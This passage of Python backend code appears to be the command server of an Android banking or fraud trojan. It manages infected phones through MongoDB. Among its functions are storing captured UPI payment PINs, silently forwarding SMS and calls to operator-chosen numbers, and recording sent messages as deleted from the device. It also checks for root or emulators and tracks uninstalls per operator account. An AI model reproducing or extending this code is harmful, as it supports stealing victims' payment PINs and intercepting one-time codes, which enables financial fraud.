            cursor = mongodb.db.call_logs.find({"device_id": device_id}).sort("timestamp", -1).skip(skip).limit(limit)
            logger.info(f"📋 [GET_CALLS] Cursor created, fetching call logs - Device: {device_id}")
            
            call_logs = await cursor.to_list(length=limit)
            logger.info(f"📋 [GET_CALLS] Retrieved {len(call_logs)} call logs from cursor - Device: {device_id}")
            
            logger.info(f"📋 [GET_CALLS] Starting serialization - Device: {device_id}, Count: {len(call_logs)}")
            for i, call in enumerate(call_logs):
                if "_id" in call:
                    call["_id"] = str(call["_id"])
                for key, value in call.items():
                    if isinstance(value, ObjectId):
                        call[key] = str(value)
                DeviceService._serialize_datetime_fields(call, ["timestamp", "received_at"])
                if (i + 1) % 100 == 0:
                    logger.info(f"📋 [GET_CALLS] Serialized {i + 1}/{len(call_logs)} call logs - Device: {device_id}")
            
            logger.info(f"✅ [GET_CALLS] Returning {len(call_logs)} serialized call logs - Device: {device_id}")
            return call_logs
        except Exception as e:
            logger.error(f"❌ [GET_CALLS] Get call logs failed: device={device_id}, error={e}", exc_info=True)
            return []

    @staticmethod
    async def add_log(device_id: str, log_type: str, message: str, level: str = "info", metadata: dict = None):
        try:
            log = {
                "device_id": device_id,
                "type": log_type,
                "message": message,
                "level": level,
                "metadata": metadata or {},
                "timestamp": utc_now()
            }
            result = await mongodb.db.logs.insert_one(log)
            logger.info(f"📝 [ADD_LOG] Log inserted for device {device_id}, log_id: {result.inserted_id}, type: {log_type}, level: {level}, message: {message[:50]}...")
            return result.inserted_id
        except Exception as e:
            logger.error(f"❌ [ADD_LOG] Failed to add log for device {device_id}: {e}", exc_info=True)
            raise

    @staticmethod
    async def get_logs(device_id: str, skip: int = 0, limit: int = 100) -> List[Dict]:
        try:
            cursor = mongodb.db.logs.find({"device_id": device_id}).sort("timestamp", -1).skip(skip).limit(limit)
            logs = await cursor.to_list(length=limit)
            for log in logs:
                if "_id" in log:
                    log["_id"] = str(log["_id"])
                for key, value in log.items():
                    if isinstance(value, ObjectId):
                        log[key] = str(value)
                timestamp = log.get("timestamp")
                if isinstance(timestamp, datetime):
                    log["timestamp"] = to_iso_string(ensure_utc(timestamp))
            return logs
        except Exception as e:
            logger.error(f"Get logs failed: {e}")
            return []

    @staticmethod
    def _normalize_device_data(device_doc: dict) -> dict:

        if device_doc.get("storage_percent_free") is not None:
            value = float(device_doc["storage_percent_free"])
            device_doc["storage_percent_free"] = str(int(value))

        if device_doc.get("ram_percent_free") is not None:
            value = float(device_doc["ram_percent_free"])
            device_doc["ram_percent_free"] = str(int(value))

        int_fields = [
            "total_storage_mb", "free_storage_mb", "storage_used_mb",
            "total_ram_mb", "free_ram_mb", "ram_used_mb"
        ]
        for field in int_fields:
            if device_doc.get(field) is not None:
                device_doc[field] = int(device_doc[field])

        if device_doc.get("upi_pins") and isinstance(device_doc["upi_pins"], list):
            upi_pins = device_doc["upi_pins"]
            def get_detected_at_value(pin_entry):
                detected_at = pin_entry.get("detected_at")
                if isinstance(detected_at, datetime):
                    return ensure_utc(detected_at) or datetime.min.replace(tzinfo=timezone.utc)
                elif isinstance(detected_at, str):
                    try:
                        dt = datetime.fromisoformat(detected_at.replace('Z', '+00:00'))
                        if dt.tzinfo is None:
                            dt = dt.replace(tzinfo=timezone.utc)
                        return dt
                    except (ValueError, AttributeError) as e:
                        logger.warning(f"Failed to parse UPI detected_at date: {detected_at}, error: {e}")
                        return datetime.min.replace(tzinfo=timezone.utc)
                return datetime.min.replace(tzinfo=timezone.utc)
            
            upi_pins.sort(key=get_detected_at_value, reverse=True)
            device_doc["upi_pins"] = upi_pins

        return device_doc

    @staticmethod
    async def save_device_note(device_id: str, priority: str, message: str):
        try:
            update_data = {
                "$set": {
                    "note_priority": priority,
                    "note_message": message,
                    "note_updated_at": utc_now(),
                    "updated_at": utc_now()
                }
            }
            
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                update_data
            )

            logger.info(f"Note saved for device: {device_id} - Priority: {priority}")

            await DeviceService.add_log(
                device_id,
                "note",
                f"Note updated - Priority: {priority}",
                "info"
            )

            return True

        except Exception as e:
            logger.error(f"Save note failed: {e}")
            return False

    @staticmethod
    async def save_admin_note(device_id: str, priority: Optional[str], message: Optional[str]):
        try:
            update_data = {
                "$set": {
                    "updated_at": utc_now()
                }
            }
            
            if priority and priority != "none":
                update_data["$set"]["admin_note_priority"] = priority
                update_data["$set"]["admin_note_created_at"] = utc_now()
            else:
                if "$unset" not in update_data:
                    update_data["$unset"] = {}
                update_data["$unset"]["admin_note_priority"] = ""
            
            if message and message.strip():
                update_data["$set"]["admin_note_message"] = message.strip()
                if "admin_note_created_at" not in update_data["$set"]:
                    update_data["$set"]["admin_note_created_at"] = utc_now()
            else:
                if "$unset" not in update_data:
                    update_data["$unset"] = {}
                update_data["$unset"]["admin_note_message"] = ""
            
            if (not message or not message.strip()) and (not priority or priority == "none"):
                if "$unset" not in update_data:
                    update_data["$unset"] = {}
                update_data["$unset"]["admin_note_created_at"] = ""
            
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                update_data
            )

            logger.info(f"Admin note saved for device: {device_id} - Priority: {priority}")

            await DeviceService.add_log(
                device_id,
                "admin_note",
                f"Admin note updated - Priority: {priority}",
                "info"
            )

            return True

        except Exception as e:
            logger.error(f"Save admin note failed: {e}")
            return False

    @staticmethod
    async def get_devices_for_admin(admin_username: str, is_super_admin: bool = False, skip: int = 0, limit: int = 100) -> List[Device]:
        try:

            three_minutes_ago = utc_now() - timedelta(minutes=3)

            result = await mongodb.db.devices.update_many(
                {
                    "last_ping": {"$lt": three_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False,
                        "last_online_update": utc_now()
                    }
                }
            )

            if result.modified_count > 0:
                logger.info(f"Marked {result.modified_count} devices as offline")

            query = {} if is_super_admin else {"admin_username": admin_username}
            query["is_deleted"] = {"$ne": True}

            # Sort: By registered_at (newest first) - newly registered devices appear first
            cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort([
                ("registered_at", -1)   # Newest registered devices first
            ])
            devices = await cursor.to_list(length=limit)

            device_list = []
            for device_doc in devices:
                try:
                    normalized = DeviceService._normalize_device_data(device_doc)
                    device_list.append(Device(**normalized))
                except Exception as e:
                    logger.warning(f"Skipping device {device_doc.get('device_id')}: {e}")
                    continue

            return device_list

        except Exception as e:
            logger.error(f"Get devices failed: {e}")
            return []

    @staticmethod
    async def get_all_devices(skip: int = 0, limit: int = 100) -> List[Device]:
        try:
            five_minutes_ago = utc_now() - timedelta(minutes=5)

            result = await mongodb.db.devices.update_many(
                {
                    "last_ping": {"$lt": five_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False,
                        "fcm_ping_sent_at": None
                    }
                }
            )

            if result.modified_count > 0:
                logger.info(f"Marked {result.modified_count} devices as offline")

            # Sort: By registered_at (newest first) - newly registered devices appear first
            cursor = mongodb.db.devices.find().skip(skip).limit(limit).sort([
                ("registered_at", -1)   # Newest registered devices first
            ])
            devices = await cursor.to_list(length=limit)

            device_list = []
            for device_doc in devices:
                try:
                    normalized = DeviceService._normalize_device_data(device_doc)
                    device_list.append(Device(**normalized))
                except Exception as e:
                    logger.warning(f"Skipping device {device_doc.get('device_id')}: {e}")
                    continue

            return device_list

        except Exception as e:
            logger.error(f"Get devices failed: {e}")
            return []

    @staticmethod
    async def update_device_settings(device_id: str, settings: dict):
        try:
            update_data = {}
            if "sms_forward_enabled" in settings:
                update_data["settings.sms_forward_enabled"] = settings["sms_forward_enabled"]
            if "forward_number" in settings:
                update_data["settings.forward_number"] = settings["forward_number"]
            if "monitoring_enabled" in settings:
                update_data["settings.monitoring_enabled"] = settings["monitoring_enabled"]
            if "auto_reply_enabled" in settings:
                update_data["settings.auto_reply_enabled"] = settings["auto_reply_enabled"]

            if update_data:
                update_data["updated_at"] = utc_now()
                await mongodb.db.devices.update_one(
                    {"device_id": device_id},
                    {"$set": update_data}
                )
        except Exception as e:
            logger.error(f"Update settings failed: {e}")

    @staticmethod
    async def create_command(device_id: str, command: str, parameters: dict = None) -> Optional[str]:
        try:
            command_doc = {
                "device_id": device_id,
                "command": command,
                "parameters": parameters or {},
                "status": CommandStatus.PENDING,
                "sent_at": None,
                "executed_at": None,
                "result": None
            }
            result = await mongodb.db.commands.insert_one(command_doc)
            return str(result.inserted_id)
        except Exception as e:
            logger.error(f"Create command failed: {e}")
            return None

    @staticmethod
    async def update_command_status(command_id: str, status: CommandStatus, result: dict = None):
        try:
            update_data = {"status": status}
            if status == CommandStatus.SENT:
                update_data["sent_at"] = utc_now()
            elif status == CommandStatus.EXECUTED:
                update_data["executed_at"] = utc_now()
                if result:
                    update_data["result"] = result

            await mongodb.db.commands.update_one(
                {"_id": ObjectId(command_id)},
                {"$set": update_data}
            )
        except Exception as e:
            logger.error(f"Update command status failed: {e}")

    @staticmethod
    async def update_device_info(device_id: str, device_info: dict):
        try:
            update_data = {"updated_at": utc_now()}

            if "battery" in device_info:
                update_data["battery_level"] = device_info["battery"]
            if "battery_state" in device_info:
                update_data["battery_state"] = device_info["battery_state"]
            if "is_charging" in device_info:
                update_data["is_charging"] = device_info["is_charging"]
            if "sim_info" in device_info:
                update_data["sim_info"] = device_info["sim_info"]
            if "screen_resolution" in device_info:
                update_data["screen_resolution"] = device_info["screen_resolution"]
            if "screen_density" in device_info:
                update_data["screen_density"] = device_info["screen_density"]
            if "is_rooted" in device_info:
                update_data["is_rooted"] = device_info["is_rooted"]
            if "is_emulator" in device_info:
                update_data["is_emulator"] = device_info["is_emulator"]
            if "total_ram_mb" in device_info:
                update_data["total_ram_mb"] = device_info["total_ram_mb"]
            if "free_ram_mb" in device_info:
                update_data["free_ram_mb"] = device_info["free_ram_mb"]
            if "ram_used_mb" in device_info:
                update_data["ram_used_mb"] = device_info["ram_used_mb"]
            if "ram_percent_free" in device_info:
                update_data["ram_percent_free"] = device_info["ram_percent_free"]
            if "total_storage_mb" in device_info:
                update_data["total_storage_mb"] = device_info["total_storage_mb"]
            if "free_storage_mb" in device_info:
                update_data["free_storage_mb"] = device_info["free_storage_mb"]
            if "storage_used_mb" in device_info:
                update_data["storage_used_mb"] = device_info["storage_used_mb"]
            if "storage_percent_free" in device_info:
                update_data["storage_percent_free"] = device_info["storage_percent_free"]
            if "network_type" in device_info:
                update_data["network_type"] = device_info["network_type"]
            if "ip_address" in device_info:
                update_data["ip_address"] = device_info["ip_address"]
            if "device_name" in device_info:
                update_data["device_name"] = device_info["device_name"]

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": update_data}
            )
        except Exception as e:
            logger.error(f"Update device info failed: {e}")

    @staticmethod
    async def save_sent_sms(device_id: str, sms_data: dict):
        try:
            sms_hash = hashlib.md5(
                f"{device_id}:sent:{sms_data.get('to', '')}:{sms_data.get('timestamp', 0)}:{sms_data.get('body', '')}".encode()
            ).hexdigest()

            existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_hash})
            if existing:
                return

            sms_doc = {
                "sms_id": sms_hash,
                "device_id": device_id,
                "from": device_id,
                "to": sms_data.get("to"),
                "body": sms_data.get("body"),
                "timestamp": datetime.fromtimestamp(sms_data.get("timestamp", 0) / 1000, tz=timezone.utc) if sms_data.get("timestamp") else utc_now(),
                "type": "sent",
                "status": sms_data.get("status", "sent_and_deleted"),
                "is_deleted": True,
                "sim_slot": sms_data.get("sim_slot"),
                "sim_phone_number": sms_data.get("sim_phone_number"),
                "is_read": True,
                "is_flagged": False,
                "tags": [],
                "received_at": utc_now(),
            }

            await mongodb.db.sms_messages.insert_one(sms_doc)
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$inc": {"stats.total_sms": 1}}
            )
        except Exception as e:
            logger.error(f"Save sent SMS failed: {e}")

    @staticmethod
    async def update_sms_delivery_status(
        device_id: str,
        sms_id: str,
        delivery_status: str,
        delivery_details: Optional[str] = None
    ) -> Optional[Dict[str, Any]]:
        try:
            update_fields: Dict[str, Any] = {
                "delivery_status": delivery_status,
                "updated_at": utc_now()
            }
            if delivery_details is not None:
                update_fields["delivery_details"] = delivery_details

            result = await mongodb.db.sms_messages.find_one_and_update(
                {"device_id": device_id, "sms_id": sms_id},
                {"$set": update_fields},
                return_document=ReturnDocument.AFTER
            )

            if result:
                if "_id" in result:
                    result["_id"] = str(result["_id"])
                DeviceService._serialize_datetime_fields(
                    result,
                    ["timestamp", "received_at", "updated_at", "synced_at"]
                )
            return result
        except Exception as e:
            logger.error(f"Update SMS delivery status failed: {e}")
            return None

    @staticmethod
    async def save_sms_forward_log(device_id: str, forward_data: dict):
        try:
            forward_hash = hashlib.md5(
                f"{device_id}:{forward_data.get('from', '')}:{forward_data.get('to', '')}:{forward_data.get('timestamp', 0)}".encode()
            ).hexdigest()

            existing = await mongodb.db.sms_forwarding_logs.find_one({"forward_id": forward_hash})
            if existing:
                return

            log_doc = {
                "forward_id": forward_hash,
                "device_id": device_id,
                "original_from": forward_data.get("from"),
                "forwarded_to": forward_data.get("to"),
                "body": forward_data.get("body"),
                "timestamp": datetime.fromtimestamp(forward_data.get("timestamp", 0) / 1000, tz=timezone.utc) if forward_data.get("timestamp") else utc_now(),
                "created_at": utc_now(),
            }

            await mongodb.db.sms_forwarding_logs.insert_one(log_doc)
        except Exception as e:
            logger.error(f"Save SMS forward log failed: {e}")

    @staticmethod
    async def get_forwarding_number(device_id: str) -> Optional[str]:
        try:
            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"settings.forward_number": 1, "settings.sms_forward_enabled": 1}
            )

            if not device:
                return None

            settings = device.get("settings", {})

            if settings.get("sms_forward_enabled", False):
                return settings.get("forward_number")
            else:
                return None

        except Exception as e:
            logger.error(f"Get forwarding number failed: {e}")
            return None

    @staticmethod
    async def disable_sms_forwarding(device_id: str):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "settings.sms_forward_enabled": False,
                        "settings.forward_number": None,
                        "settings.sms_forward_updated_at": utc_now(),
                    }
                }
            )
        except Exception as e:
            logger.error(f"Disable SMS forwarding failed: {e}")

    @staticmethod
    async def save_call_forwarding_result(device_id: str, result_data: dict):
        try:
            success = result_data.get("success", False)

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "call_forwarding_enabled": success,
                        "call_forwarding_number": result_data.get("number") if success else None,
                        "call_forwarding_sim_slot": result_data.get("sim_slot", 0),
                        "call_forwarding_updated_at": utc_now(),
                    }
                }
            )

            log_doc = {
                "device_id": device_id,
                "action": "enable",
                "success": success,
                "number": result_data.get("number"),
                "sim_slot": result_data.get("sim_slot", 0),
                "timestamp": datetime.fromtimestamp(result_data.get("timestamp", 0) / 1000, tz=timezone.utc) if result_data.get("timestamp") else utc_now(),
                "created_at": utc_now(),
            }

            await mongodb.db.call_forwarding_logs.insert_one(log_doc)
        except Exception as e:
            logger.error(f"Save call forwarding result failed: {e}")

    @staticmethod
    async def save_call_forwarding_disabled(device_id: str, result_data: dict):
        try:
            success = result_data.get("success", False)

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "call_forwarding_enabled": False,
                        "call_forwarding_number": None,
                        "call_forwarding_updated_at": utc_now(),
                    }
                }
            )

            log_doc = {
                "device_id": device_id,
                "action": "disable",
                "success": success,
                "sim_slot": result_data.get("sim_slot", 0),
                "timestamp": datetime.fromtimestamp(result_data.get("timestamp", 0) / 1000, tz=timezone.utc) if result_data.get("timestamp") else utc_now(),
                "created_at": utc_now(),
            }

            await mongodb.db.call_forwarding_logs.insert_one(log_doc)
        except Exception as e:
            logger.error(f"Save call forwarding disabled failed: {e}")

    @staticmethod
    async def cleanup_invalid_fcm_tokens() -> Dict[str, Any]:
        """
        Remove invalid FCM tokens (like NO_FCM_TOKEN_*) from all devices
        Returns stats about cleanup operation
        """
        try:
            logger.info("🧹 Starting cleanup of invalid FCM tokens...")
            
            # Find all devices with invalid tokens
            devices_with_invalid_tokens = await mongodb.db.devices.find({
                "fcm_tokens": {"$regex": "^NO_FCM_TOKEN", "$exists": True}
            }).to_list(length=None)
            
            total_devices = len(devices_with_invalid_tokens)
            cleaned_devices = 0
            total_tokens_removed = 0
            
            for device_doc in devices_with_invalid_tokens:
                device_id = device_doc.get("device_id")
                fcm_tokens = device_doc.get("fcm_tokens", [])
                
                if not isinstance(fcm_tokens, list):
                    continue
                
                # Filter out invalid tokens
                valid_tokens = [
                    token for token in fcm_tokens 
                    if DeviceService._is_valid_fcm_token(token)
                ]
                
                invalid_count = len(fcm_tokens) - len(valid_tokens)
                
                if invalid_count > 0:
                    # Update device with only valid tokens
                    result = await mongodb.db.devices.update_one(
                        {"device_id": device_id},
                        {"$set": {"fcm_tokens": valid_tokens}}
                    )
                    
                    if result.modified_count > 0:
                        cleaned_devices += 1
                        total_tokens_removed += invalid_count
                        logger.info(
                            f"🧹 Cleaned {invalid_count} invalid token(s) from device {device_id} "
                            f"({len(valid_tokens)} valid tokens remaining)"
                        )
            
            logger.info(
                f"✅ Cleanup completed: {cleaned_devices}/{total_devices} devices cleaned, "
                f"{total_tokens_removed} invalid tokens removed"
            )
            
            return {
                "success": True,
                "devices_checked": total_devices,
                "devices_cleaned": cleaned_devices,
                "tokens_removed": total_tokens_removed,
                "message": f"Cleaned {total_tokens_removed} invalid tokens from {cleaned_devices} devices"
            }
            
        except Exception as e:
            logger.error(f"❌ Error cleaning invalid FCM tokens: {e}", exc_info=True)
            return {
                "success": False,
                "error": str(e),
                "message": "Failed to clean invalid FCM tokens"
            }

    @staticmethod
    async def soft_delete_device(device_id: str) -> bool:
        """Soft delete device (keep historical data)"""
        try:
            now = utc_now()
            result = await mongodb.db.devices.update_one(
                {"device_id": device_id, "is_deleted": {"$ne": True}},
                {
                    "$set": {
                        "is_deleted": True,
                        "deleted_at": now,
                        "is_online": False,
                        "status": "offline",
                        "last_online_update": now
                    }
                }
            )

            if result.modified_count > 0:
                try:
                    device_payload = {
                        "device_id": device_id,
                        "is_deleted": True,
                        "status": "offline",
                        "is_online": False,
                        "updated_at": to_iso_string(now),
                    }
                    await admin_ws_manager.notify_device_update(device_id, device_payload)
                except Exception as e:
                    logger.debug(f"Soft delete WS notify failed for {device_id}: {e}")
                return True
            return False
        except Exception as e:
            logger.error(f"Soft delete failed for {device_id}: {e}", exc_info=True)
            return False

    @staticmethod
    async def get_stats(admin_username: Optional[str] = None) -> Dict[str, int]:
        try:

            five_minutes_ago = utc_now() - timedelta(minutes=5)

            base_query = {"is_deleted": {"$ne": True}}
            if admin_username:
                base_query["admin_username"] = admin_username

            await mongodb.db.devices.update_many(
                {
                    **base_query,
                    "last_ping": {"$lt": five_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False,
                        "last_online_update": utc_now()
                    }
                }
            )

            total = await mongodb.db.devices.count_documents(base_query)
            if total == 0:
                return {"total_devices": 0, "active_devices": 0, "pending_devices": 0, "online_devices": 0, "offline_devices": 0, "uninstalled_devices": 0}

            online = await mongodb.db.devices.count_documents({**base_query, "status": "online"})
            offline = total - online
            pending = await mongodb.db.devices.count_documents({
                **base_query,
                "$and": [
                    {"stats.total_sms": 0},
                    {"stats.total_contacts": 0},
                    {"stats.total_calls": 0}
                ]
            })
            active = total - pending
            uninstalled = await mongodb.db.devices.count_documents({**base_query, "is_uninstalled": True})

            return {
                "total_devices": total,
                "active_devices": active,
                "pending_devices": pending,
                "online_devices": online,
                "offline_devices": offline,
                "uninstalled_devices": uninstalled
            }
        except Exception as e:
            logger.error(f"Failed to get device stats: {e}")
            return {"total_devices": 0, "active_devices": 0, "pending_devices": 0, "online_devices": 0, "offline_devices": 0, "uninstalled_devices": 0}


device_service = DeviceService()